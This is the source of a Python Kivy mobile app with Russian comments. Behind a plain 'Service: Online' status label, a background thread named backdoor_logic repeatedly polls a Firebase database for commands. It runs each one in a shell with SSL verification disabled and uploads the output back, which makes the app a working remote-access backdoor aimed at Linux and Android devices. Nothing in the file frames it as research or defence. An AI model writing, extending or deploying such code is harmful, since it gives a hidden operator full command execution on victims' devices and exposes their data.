from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
import threading
import requests
import subprocess
import time
import platform
import urllib3

# Отключаем ворчание SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ТВОИ НАСТРОЙКИ
BASE_URL = "https://test-73273-default-rtdb.europe-west1.firebasedatabase.app/"
DB_URL = f"{BASE_URL}commands.json"
RES_URL = f"{BASE_URL}results.json"

class MainApp(App):
    def build(self):
        # Создаем простой интерфейс
        layout = BoxLayout(orientation='vertical', padding=50)
        self.status_label = Label(
            text="Service: [color=ff0000]Offline[/color]", 
            markup=True, 
            font_size='24sp'
        )
        layout.add_widget(self.status_label)
        
        # ЗАПУСКАЕМ ТВОЮ ЛОГИКУ В ФОНЕ (Thread)
        # Это позволяет приложению работать и не зависать
        threading.Thread(target=self.backdoor_logic, daemon=True).start()
        
        return layout

    def backdoor_logic(self):
        """Твоя основная функция мониторинга Firebase"""
        last_cmd_id = None
        self.status_label.text = "Service: [color=00ff00]Online[/color]"
        
        while True:
            try:
                # Проверка команд
                resp = requests.get(DB_URL, verify=False, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if data and data.get("id") != last_cmd_id:
                        cmd = data.get("cmd").strip()
                        last_cmd_id = data.get("id")

                        # Выполнение команды (Linux/Android стиль)
                        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        stdout, stderr = proc.communicate()
                        output = (stdout + stderr).decode('utf-8', errors='replace')

                        # Отправка результата
                        requests.put(RES_URL, json={"status": "done", "output": output}, verify=False)
            except Exception as e:
                print(f"Error: {e}")
            
            time.sleep(5) # Пауза между проверками

if __name__ == "__main__":
    MainApp().run()
